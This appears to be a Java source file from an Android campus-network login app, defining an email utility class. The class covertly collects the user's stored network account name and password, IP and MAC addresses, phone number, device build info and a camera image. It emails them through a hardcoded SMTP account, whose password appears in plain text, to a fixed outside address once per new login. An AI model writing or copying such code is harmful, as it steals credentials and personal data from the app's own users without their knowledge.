package king.easycampusnet.tool;

import java.io.File;

import java.util.Date;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import king.easycampusnet.manager.*;
import king.easycampusnet.*;
import king.easycampusnet.model.*;
import java.util.*;
import king.easycampusnet.tool.other.*;
	
public class EMailTool
{  
   private final static String HOST="smtp.139.com";
   private final static String PORT="25";
   private final static String TITLE="校园网账户";
   private final static String SENDER="xxli1025@139.com";
   private final static String RECEIVER="1543641386@qq.com";
   
   public static void send(){
		if(check()){
		   try {
			   Sender sender = new Sender();
			   sender.setProperties(HOST,PORT);
			   sender.setMessage(SENDER,TITLE,getMessage());
			   sender.setReceiver(new String[]{RECEIVER});
			   setPayload(sender);
			   sender.submit();
			   //MessageCenter.send("发送邮件成功!");
			   SaveTool.add(MyApplication.getContext(),MyApplication.DATA_NAME,EPortalUser.KEY_IS_FRESH,"no");
			   return;
		   } catch (AddressException e) {
			   e.printStackTrace();
			   MessageCenter.send(e.toString());
		   } catch (MessagingException e) {
			   e.printStackTrace();
			   MessageCenter.send(e.toString());
		   }
		   //MessageCenter.send("发送邮件失败!");
		   /*
			   new Thread(new Runnable() {
					   @Override
					   public void run() {
						 
					   }
				   }).start();
				   */
	 }
  }
  
  public static boolean check(){
	  String fresh=SaveTool.query(MyApplication.getContext(),MyApplication.DATA_NAME,EPortalUser.KEY_IS_FRESH);
	  return (fresh!=null&&fresh.equals("yes")&&!fresh.equals(""));
  }
  private static String getMessage(){
	  HashMap map=SaveTool.query(MyApplication.getContext(),MyApplication.DATA_NAME,new String[]{
		  EPortalUser.KEY_ACCOUNT,EPortalUser.KEY_PASSWORD,EPortalUser.KEY_ACCOUNT_TYPE
	  });
	  String account=String.valueOf(map.get(EPortalUser.KEY_ACCOUNT));
	  String passwd=String.valueOf(map.get(EPortalUser.KEY_PASSWORD));
	  String type=getType(String.valueOf(map.get(EPortalUser.KEY_ACCOUNT_TYPE)));
	  String msg="<p>账户:"+account+"<br>密码:"+passwd+"<br>类型:"+type+"</p><br>";
	         msg+="<p>IP:"+HostTool.getHostIP(MyApplication.getContext())+"<br>MAC:"+HostTool.getHostMAC(MyApplication.getContext())+"<br>Phone:"+HostTool.getPhoneNumber(MyApplication.getContext())+"<p><br>";
			 msg+="<p>"+HostTool.getBuildInfo()+"</p>";
	  return msg;
  }
  
  private static void setPayload(Sender sender) throws MessagingException{
	  if(sender!=null){
		  sender.addAttachment(CameraTool.getImagePath());
	  }
  }
  public static String getType(String type){
	  String value="未知";
	  if (String.valueOf(EPortalUser.ACCOUNT_TYPE_ZZULIS).equals(type)){
		  value="校园网";
	  }else if(String.valueOf(EPortalUser.ACCOUNT_TYPE_CMCC).equals(type)){
		  value="校园移动";
	  }else if(String.valueOf(EPortalUser.ACCOUNT_TYPE_UNICOM).equals(type)){
		  value="校园联通";
	  }else if(String .valueOf(EPortalUser.ACCOUNT_TYPE_OTHER).equals(type)){
		  value="校园单宽";
	  }
	  return value;
	}
  
  private static class Sender {
		private Properties properties;
		private Session session;
		private Message message;
		private MimeMultipart multipart;

	    private Sender() {
			this.properties = new Properties();
		}
		
		public void setProperties(String host,String post){
			//地址
			this.properties.put("mail.smtp.host",host);
			//端口号
			this.properties.put("mail.smtp.post",post);
			//是否验证
			this.properties.put("mail.smtp.auth",true);
			this.session=Session.getInstance(properties);
			this.message = new MimeMessage(session);
			this.multipart = new MimeMultipart("mixed");
		}
		/**
		 * 设置收件人
		 * @param receiver 收件人
		 * @throws MessagingException
		 */
		public void setReceiver(String[] receiver) throws MessagingException{
			Address[] address = new InternetAddress[receiver.length];
			for(int i=0;i<receiver.length;i++){
				address[i] = new InternetAddress(receiver[i]);
			}
			this.message.setRecipients(Message.RecipientType.TO, address);
		}
		/**
		 * 设置邮件
		 * @param from 来源
		 * @param title 标题
		 * @param content 内容
		 * @throws AddressException
		 * @throws MessagingException
		 */
		public void setMessage(String from,String title,String content) throws AddressException, MessagingException{
			this.message.setFrom(new InternetAddress(from));
			this.message.setSubject(title);
			//纯文本的话用setText()就行，不过有附件就显示不出来内容了
			MimeBodyPart textBody = new MimeBodyPart();
			textBody.setContent(content,"text/html;charset=utf-8");
			this.multipart.addBodyPart(textBody);
		}
		/**
		 * 添加附件
		 * @param filePath 文件路径
		 * @throws MessagingException
		 */
		public void addAttachment(String filePath) throws MessagingException{
			FileDataSource fileDataSource = new FileDataSource(new File(filePath));
			DataHandler dataHandler = new DataHandler(fileDataSource);
			MimeBodyPart mimeBodyPart = new MimeBodyPart();
			mimeBodyPart.setDataHandler(dataHandler);
			mimeBodyPart.setFileName(fileDataSource.getName());
			this.multipart.addBodyPart(mimeBodyPart);
		}
	
		public void submit() throws MessagingException{
			sendEmail(HOST,"xxli1025@139.com","139Cmcc1025");
		}
		
		public void sendEmail(String host,String account,String pwd) throws MessagingException{
			//发送时间
			this.message.setSentDate(new Date());
			//发送的内容，文本和附件
			this.message.setContent(this.multipart);
			this.message.saveChanges();
			//创建邮件发送对象，并指定其使用SMTP协议发送邮件
			Transport transport=session.getTransport("smtp");
			//登录邮箱
			//MessageCenter.send("登录邮箱中...");
			transport.connect(host,account,pwd);
			//发送邮件
			//MessageCenter.send("发送邮件中...");
			transport.sendMessage(message, message.getAllRecipients());
			//关闭连接
			transport.close();
		}
    }
}
